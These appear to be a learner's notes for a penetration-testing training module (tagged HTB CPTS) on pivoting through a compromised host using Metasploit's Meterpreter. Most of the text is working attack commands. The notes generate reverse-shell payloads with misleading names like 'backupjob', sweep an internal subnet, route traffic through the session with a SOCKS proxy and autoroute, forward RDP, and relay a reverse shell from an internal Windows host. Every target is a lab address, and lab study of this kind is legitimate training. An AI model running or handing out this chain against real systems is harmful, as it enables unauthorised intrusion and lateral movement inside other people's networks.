**Module:** Pivoting, Tunneling, and Port Forwarding — Section 5 / 18

---

## The Problem

You have a Meterpreter session on a pivot host. You want to reach internal hosts — but your attack host tools can't talk to the internal network directly.

```
Attack Host          Pivot Host (Ubuntu)       Internal Target
10.10.14.18          10.129.202.64             172.16.5.19
                     172.16.5.129
                     
Your tools can't reach 172.16.5.0/23 — only the pivot host can.
```

**Solution:** Use the Meterpreter session itself as a tunnel — no SSH needed.

---

## Full Attack Chain

### Step 1 — Generate payload for pivot host

bash

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.18 \
  LPORT=8080 \
  -f elf -o backupjob
```

### Step 2 — Start handler on attack host

```
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8080
run
```

### Step 3 — Execute on pivot host

bash

```bash
scp backupjob ubuntu@10.129.202.64:~/
chmod +x backupjob
./backupjob
```

Meterpreter session opens on attack host.

---

## Ping Sweep (discover internal hosts)

**Via Meterpreter module:**

```
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

**Via shell one-liners (if you drop into a shell on the pivot):**

bash

```bash
# Linux
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done

# Windows CMD
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# PowerShell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

> If no replies on first run, do it twice — ARP cache may not be built yet.

---

## SOCKS Proxy (route all tools through session)

**Why:** proxychains, nmap, crackmapexec etc. have no route to 172.16.5.0/23. The SOCKS proxy fixes that by forwarding their traffic through the Meterpreter session.

```
Traffic flow:
Tool → 127.0.0.1:9050 → Meterpreter session → pivot host → internal target
```

**Start the proxy:**

```
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
```

Verify it's running:

```
jobs
```

**Edit `/etc/proxychains.conf`** (add at bottom):

```
socks4  127.0.0.1 9050
```

> If using SOCKS5, change `socks4` → `socks5`.

---

## AutoRoute (tell MSF which subnet goes through which session)

**From MSF console:**

```
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run
```

**Or from inside Meterpreter:**

```
run autoroute -s 172.16.5.0/23
```

**Verify routes:**

```
run autoroute -p
```

Expected output:

```
Subnet             Netmask            Gateway
172.16.5.0         255.255.254.0      Session 1
```

---

## Use proxychains with nmap

bash

```bash
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

> Must use `-sT` (TCP connect scan) — SYN scan doesn't work through proxychains.  
> `-Pn` because ICMP won't route through the proxy.

---

## portfwd (direct port tunnel, no proxychains needed)

Forward a specific port through the session directly.

```
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

```
Attack Host :3300  ──►  Meterpreter session  ──►  172.16.5.19:3389
```

Then RDP straight to localhost:

bash

```bash
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

Verify with:

bash

```bash
netstat -antp
```

---

## Reverse portfwd (catch a shell from internal host through pivot)

Used when the Windows target has no route to your attack host — make it connect to the pivot instead, pivot relays back to you.

```
Traffic flow:
Windows → pivot:1234 → (Meterpreter relay) → attack host:8081 → MSF handler
```

**Step 1 — Set up reverse forward rule (from Meterpreter):**

```
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

**Step 2 — Background session, start handler:**

```
bg
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8081
run
```

**Step 3 — Generate Windows payload (points to pivot, not attack host):**

bash

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=172.16.5.129 \
  LPORT=1234 \
  -f exe -o backupscript.exe
```

**Step 4 — Execute on Windows target → shell arrives at MSF on port 8081.**

---

## portfwd Flag Reference

|Flag|Meaning|
|---|---|
|`-l`|Local port to listen on (attack host)|
|`-p`|Remote port to connect to|
|`-r`|Remote host to connect to|
|`-L`|Local host (for reverse: your attack host IP)|
|`-R`|Reverse port forward|

---

## SOCKS Proxy vs portfwd

||SOCKS Proxy|portfwd|
|---|---|---|
|Setup|`socks_proxy` + `autoroute` + proxychains|`portfwd add` in Meterpreter|
|Use case|Route any tool into internal network|Forward one specific port|
|Requires proxychains|Yes|No|
|Flexibility|High — any tool, any target|Single port/host at a time|

---

## Session Management

|Action|Command|
|---|---|
|Background session|`bg`|
|List sessions|`sessions`|
|Resume session|`sessions -i 1`|

---

## Tags

`#htb` `#cpts` `#pivoting` `#meterpreter` `#socks` `#proxychains` `#portfwd` `#msf`